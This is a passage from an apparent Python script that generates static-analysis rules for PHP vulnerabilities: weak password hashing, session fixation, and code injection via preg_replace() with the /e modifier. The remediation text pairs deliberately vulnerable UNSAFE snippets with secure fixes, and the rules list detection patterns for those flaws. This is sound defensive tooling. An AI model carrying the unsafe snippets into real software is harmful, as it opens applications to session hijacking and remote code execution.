    "  $hash = hash_pbkdf2('sha256', $password, $salt, 310000);\n\n"
    "BEST (password_hash — recommended for PHP):\n"
    "  $hash = password_hash($password, PASSWORD_ARGON2ID);\n"
    "  // Verify with:\n"
    "  password_verify($password, $hash);\n\n"
    "See NIST SP 800-132, PHP password_hash() documentation, and OWASP Password Storage Cheat Sheet.")
)

wr("php","php_session_fixation",RE["sess"],"Cookie Security","CWE-384","A07:2021-Identification and Authentication Failures",
   8.1,"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N","High","Tentative",
   "Session Fixation: PHP session_id() accepting user-controlled session identifier",
   ("The application calls session_id() with a value derived from user input (GET/POST/Cookie) "
    "before session_start(). This allows an attacker to set a known session ID, wait for the "
    "victim to authenticate, and then use the pre-known session ID to impersonate the authenticated "
    "user — bypassing authentication without needing the victim's credentials."),
   PHP_SRC,["session_id($_GET","session_id($_POST","session_id($_COOKIE","session_id($_REQUEST"],["session_regenerate_id(true","unset($_SESSION"],
   ("Never accept a session ID from user input. Always regenerate the session ID after authentication.\n\n"
    "UNSAFE:\n"
    "  session_id($_GET['sid']);  /* attacker controls the session ID */\n"
    "  session_start();\n\n"
    "SAFE:\n"
    "  session_start();  /* PHP generates a secure random session ID */\n"
    "  // After successful login, regenerate to prevent fixation:\n"
    "  session_regenerate_id(true);\n\n"
    "Set session.use_only_cookies=1 and session.use_strict_mode=1 in php.ini. "
    "See OWASP Session Management Cheat Sheet and PHP session security documentation.")
)

wr("php","php_preg_replace_eval",RE["preg_e"],"Code Injection","CWE-94","A03:2021-Injection",
   9.8,"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H","Critical","Confirmed",
   "Code Injection via PHP preg_replace() with /e modifier evaluating replacement as PHP code",
   ("The preg_replace() function is called with a pattern containing the /e (eval) modifier, "
    "which evaluates the replacement string as PHP code after performing substitution. User-"
    "controlled input that flows into the subject, replacement string, or pattern enables "
    "arbitrary PHP code execution. This modifier was deprecated in PHP 5.5 and removed in PHP 7.0."),
   PHP_SRC,["preg_replace('/.*/e'","preg_replace(\"/.*/e\"","preg_replace('/.*$/e'"],["preg_replace_callback("],
   ("Replace preg_replace() with /e modifier with preg_replace_callback() which does not eval.\n\n"
    "UNSAFE:\n"
    "  preg_replace('/<tag>(.*)<\\/tag>/e', 'strtoupper(\"$1\")', $userInput);  /* RCE */\n\n"
    "SAFE:\n"
    "  preg_replace_callback('/<tag>(.*)<\\/tag>/',\n"
    "      function($matches) { return strtoupper($matches[1]); },\n"
    "      $userInput);\n\n"
    "The /e modifier is completely removed in PHP 7.0+. If your codebase still uses it, "
    "upgrade PHP immediately and replace all /e patterns with preg_replace_callback(). "
    "See PHP migration guide 5.6→7.0 and OWASP Injection Prevention Cheat Sheet.")
)

print("\nBatch 14: All 40 rules written! 5 per language, diverse CVE domains.")
